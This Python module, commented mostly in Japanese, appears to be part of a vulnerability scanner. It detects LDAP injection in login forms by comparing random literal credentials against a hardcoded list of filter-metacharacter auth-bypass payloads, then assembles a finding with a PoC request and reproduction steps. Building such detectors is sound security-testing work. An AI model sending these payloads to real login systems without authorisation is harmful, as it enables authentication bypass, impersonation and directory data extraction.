"""
Smart LDAP Injection Hunter - LDAP インジェクション 検出スペシャリスト (SGK-2026-0499)

ログイン等の入力が LDAP 検索フィルタ（例 ``(&(cn=<user>)(sn=<pass>))``）に文字列連結
されると、``*``（ワイルドカード）や ``)(``（フィルタ閉じ→再オープン）等のメタ文字で
フィルタ意味論を書き換えられ、正当な資格情報なしに認証をバイパスできる（認可バイパス）。

確定は「決定論的差分」で行う（NoSQLi/IDOR の authz_diff と同型）:
  - 負のコントロール（メタ文字を含まないランダムなリテラル資格情報）→ 失敗（成功印なし）
  - LDAP メタ文字ペイロード → 成功（成功印あり）
両者の差分が「入力が LDAP フィルタとして解釈された」証拠になる。

「成功印」は task 由来（``ldap_success_marker``）を優先し、無ければ**2 つの独立コントロールで
安定するベースラインに対し、注入応答にだけ現れる特徴行を自動導出**する（製品固有文字列を
エンジンにハードコードしない）。非破壊（読み取り専用の検索・ディレクトリ改変なし）。
"""
import logging
import re
import uuid
from typing import Any, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

# LDAP フィルタのメタ文字シグネチャ（確定バーと共有語彙）。リテラルには現れない。
_LDAP_METACHAR_RE = re.compile(r"\*|\)\(|\(\||\(&")

# 認証バイパス用の (username, password) ペイロード。ワイルドカード〜フィルタ破壊まで。
_LDAP_PAYLOADS: Tuple[Tuple[str, str], ...] = (
    ("*", "*"),
    ("*)(cn=*))(|(cn=*", "*"),
    ("*)(uid=*))(|(uid=*", "*"),
    ("admin)(&", "*"),
    ("*)(objectClass=*", "*"),
)
_LDAP_SNIPPET_CAP = 1500
_MARKER_MIN_LEN = 8


def _mask_auth(headers: Dict[str, str]) -> Dict[str, str]:
    out = {}
    for k, v in (headers or {}).items():
        if str(k).lower() in ("authorization", "cookie", "x-api-key"):
            out[k] = "<redacted>"
        else:
            out[k] = v
    return out


def _lines(text: str) -> List[str]:
    return [ln.strip() for ln in (text or "").splitlines() if ln.strip()]


def _derive_success_marker(
    inj_text: str, ctrl_a: str, ctrl_b: str, inputs: Tuple[str, ...]
) -> Optional[str]:
    """2 つのコントロールで安定するベースラインに対し、注入応答にだけ現れる特徴行を導出。

    - baseline = 両コントロールに共通して現れる行（安定した失敗状態のコンテンツ）
    - 候補 = 注入応答にあり baseline に無い行（＝注入で変わった状態＝成功印の候補）
    - 我々の送信値を含む行（入力の反射）や短すぎる行は除外し、最長の候補を採用。
    """
    base = set(_lines(ctrl_a)) & set(_lines(ctrl_b))
    lowered_inputs = [i.lower() for i in inputs if i]
    candidates: List[str] = []
    for ln in _lines(inj_text):
        if ln in base:
            continue
        if len(ln) < _MARKER_MIN_LEN or not any(c.isalnum() for c in ln):
            continue
        low = ln.lower()
        if any(inp and inp in low for inp in lowered_inputs):
            continue  # 我々の入力の反射は成功印にしない
        candidates.append(ln)
    if not candidates:
        return None
    return max(candidates, key=len)


class SmartLDAPInjectionHunter(Specialist):
    name = "SmartLDAPInjectionHunter"
    description = "LDAP injection / auth-bypass detector (differential confirmation)"
    timeout_seconds = 120
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        result = await self._probe(task)
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    def _params(self, task: Task) -> Dict[str, Any]:
        return task.params if isinstance(getattr(task, "params", None), dict) else {}

    def _auth_headers(self, task: Task) -> Dict[str, str]:
        params = self._params(task)
        _auth = params.get("_auth", {}) if isinstance(params.get("_auth"), dict) else {}
        headers = dict(_auth.get("auth_headers", {}) or {})
        cookies = str(_auth.get("cookies", "") or params.get("cookies", "") or "")
        if cookies and "Cookie" not in headers:
            headers["Cookie"] = cookies
        return headers

    async def _probe(self, task: Task) -> Optional[Dict[str, Any]]:
        params = self._params(task)
        url = task.target
        headers = self._auth_headers(task)
        user_param = str(params.get("ldap_username_param") or "username")
        pass_param = str(params.get("ldap_password_param") or "password")
        provided_marker = str(params.get("ldap_success_marker") or "").strip()

        # 2 つの独立な負のコントロール（メタ文字を含まないランダムリテラル）。
        ctrl_u1 = "shigoku_ldap_" + uuid.uuid4().hex[:10]
        ctrl_p1 = "shigoku_pw_" + uuid.uuid4().hex[:10]
        ctrl_u2 = "shigoku_ldap_" + uuid.uuid4().hex[:10]
        ctrl_p2 = "shigoku_pw_" + uuid.uuid4().hex[:10]
        try:
            ctrl1_status, ctrl1_text = await self._post_form(
                url, {user_param: ctrl_u1, pass_param: ctrl_p1}, headers)
            ctrl2_status, ctrl2_text = await self._post_form(
                url, {user_param: ctrl_u2, pass_param: ctrl_p2}, headers)
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.debug("[%s] control send failed: %s", self.name, exc)
            return None

        # provided_marker がコントロールに既出なら差分にならない → 破棄。
        if provided_marker and (
            provided_marker in ctrl1_text or provided_marker in ctrl2_text
        ):
            return None

        for u_payload, p_payload in _LDAP_PAYLOADS:
            try:
                inj_status, inj_text = await self._post_form(
                    url, {user_param: u_payload, pass_param: p_payload}, headers)
            except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
                logger.debug("[%s] injection send failed: %s", self.name, exc)
                continue
            if not (200 <= inj_status < 300):
                continue
            marker = provided_marker or _derive_success_marker(
                inj_text, ctrl1_text, ctrl2_text, (u_payload, p_payload, ctrl_u1, ctrl_u2),
            )
            if not marker:
                continue
            if marker in inj_text and marker not in ctrl1_text and marker not in ctrl2_text:
                # マーカー中心のスニペット（先頭切り詰めで証拠が落ちるのを防ぐ）。
                # コントロールは同一バイト領域を切り出し、判定に「同じ領域の両側」を
                # 見せる（SSTI/Host ヘッダ/poc-judge-raw-evidence の教訓）。
                idx = inj_text.find(marker)
                half = _LDAP_SNIPPET_CAP // 2
                start = max(0, idx - half)
                end = idx + len(marker) + half
                inj_snip = inj_text[start:end]
                ctrl_snip = ctrl1_text[start:end]
                return {
                    "request_url": url,
                    "user_param": user_param,
                    "pass_param": pass_param,
                    "inj_user": u_payload,
                    "inj_pass": p_payload,
                    "injection_payload": f"{user_param}={u_payload}&{pass_param}={p_payload}",
                    "injected_status": inj_status,
                    "injected_served_body": inj_snip,
                    "success_marker": marker,
                    "control_user": ctrl_u1,
                    "control_pass": ctrl_p1,
                    "control_status": ctrl1_status,
                    "control_served_body": ctrl_snip,
                    "auth_headers": headers,
                }
        return None

    async def _post_form(
        self, url: str, fields: Dict[str, str], headers: Dict[str, str]
    ) -> Tuple[int, str]:
        """フォーム(application/x-www-form-urlencoded)を POST（``self._client`` seam or 実クライアント）。"""
        h = dict(headers or {})

        async def _do(client):
            return await client.request("POST", url, data=dict(fields), headers=h, use_proxy=True)

        injected = getattr(self, "_client", None)
        if injected is not None:
            resp = await _do(injected)
        else:
            from src.core.infra.network_client import AsyncNetworkClient
            async with AsyncNetworkClient() as client:
                resp = await _do(client)
        status = int(getattr(resp, "status", 0) or 0)
        rbody = getattr(resp, "body", None)
        if rbody is None:
            rbody = getattr(resp, "text", "") or ""
        if isinstance(rbody, bytes):
            rbody = rbody.decode("utf-8", errors="replace")
        return status, str(rbody)

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        url = proof["request_url"]
        user_param = proof["user_param"]
        pass_param = proof["pass_param"]
        inj_user = proof["inj_user"]
        inj_pass = proof["inj_pass"]
        injection_payload = proof["injection_payload"]
        inj_status = proof["injected_status"]
        inj_body = proof["injected_served_body"]
        ctrl_user = proof["control_user"]
        ctrl_pass = proof["control_pass"]
        ctrl_status = proof["control_status"]
        ctrl_body = proof["control_served_body"]
        marker = proof["success_marker"]
        masked_headers = _mask_auth(proof.get("auth_headers", {}))
        header_lines = "".join(f"{k}: {v}\r\n" for k, v in masked_headers.items())

        # 差分の両ステップを poc に載せる（リテラル失敗×メタ文字成功の対比が必須）。
        poc_request = (
            "# Step 1 — negative control (literal, no LDAP metacharacters; expected to FAIL)\r\n"
            f"POST {url} HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"{header_lines}"
            "\r\n"
            f"{user_param}={ctrl_user}&{pass_param}={ctrl_pass}\r\n"
            "\r\n"
            "# Step 2 — LDAP metacharacter injection (expected to SUCCEED = auth bypass)\r\n"
            f"POST {url} HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"{header_lines}"
            "\r\n"
            f"{injection_payload}"
        )
        poc_response = (
            "# Step 1 response — literal credentials are rejected (no success marker)\r\n"
            f"HTTP/1.1 {ctrl_status}\r\n"
            "\r\n"
            f"{ctrl_body}\r\n"
            "\r\n"
            "# Step 2 response — LDAP metacharacters authenticate (success marker present)\r\n"
            f"HTTP/1.1 {inj_status}\r\n"
            "\r\n"
            f"{inj_body}\r\n"
            "\r\n"
            f"CORRELATION: the success indicator \"{marker}\" appears ONLY after sending LDAP "
            f"filter metacharacters ('{inj_user}' / '{inj_pass}') and is ABSENT for random "
            "literal credentials with no metacharacters. The only cause is that the input is "
            "concatenated into an LDAP search filter and our metacharacters altered its "
            "semantics => LDAP injection / authentication bypass confirmed."
        )
        impact = (
            f"ログイン入力（{user_param}/{pass_param}）に LDAP フィルタのメタ文字（例 '{inj_user}'）"
            f"を送ると、正当な資格情報なしに認証が成功する（成功印 \"{marker}\" が出現・"
            f"HTTP {inj_status}）。メタ文字を含まないランダムなリテラルでは失敗する"
            f"（HTTP {ctrl_status}・成功印なし）のとの差分から、入力が LDAP 検索フィルタとして"
            "解釈される LDAP インジェクション＝認証バイパスが確定。任意ユーザーへの成りすまし・"
            "ディレクトリ情報の抽出に直結する実害（非破壊＝読み取り専用で確認）。"
        )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.LDAP_INJECTION,
            severity=Severity.CRITICAL,
            title="LDAP Injection (authentication bypass) via filter metacharacters",
            description=(
                "LDAP injection confirmed by differential: filter metacharacters authenticate "
                f"(HTTP {inj_status}, marker present) while random literal credentials fail "
                f"(HTTP {ctrl_status}, marker absent)."
            ),
            source_agent=self.name,
            confidence=0.96,
            impact=impact,
            reproduction_steps=[
                f"メタ文字を含まないランダムなリテラルを {user_param}/{pass_param} に送り、"
                f"失敗（成功印なし・HTTP {ctrl_status}）を確認する。",
                f"{user_param} に LDAP メタ文字（例 '{inj_user}'）を送ると、正当な資格情報なしに"
                f"成功印 \"{marker}\" が出る（HTTP {inj_status}）ことを確認する（差分＝LDAP 注入）。",
            ],
            tags=["ldap_injection", "auth_bypass", "critical", "ldap_injection_confirmed"],
            evidence=Evidence(
                request_method="POST",
                request_url=url,
                request_headers={"Content-Type": "application/x-www-form-urlencoded",
                                 **proof.get("auth_headers", {})},
                request_body=injection_payload,
                response_status=inj_status,
                response_headers={},
                response_body=inj_body,
            ),
            additional_info={
                "ldap_evidence": {
                    "request_url": url,
                    "injection_payload": injection_payload,
                    "success_marker": marker,
                    "injected_status": inj_status,
                    "injected_served_body": inj_body,
                    "control_served_body": ctrl_body,
                },
                "ldap_replay": {
                    "method": "POST",
                    "url": url,
                    "user_param": user_param,
                    "pass_param": pass_param,
                    "inj_user": inj_user,
                    "inj_pass": inj_pass,
                    "success_marker": marker,
                },
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )
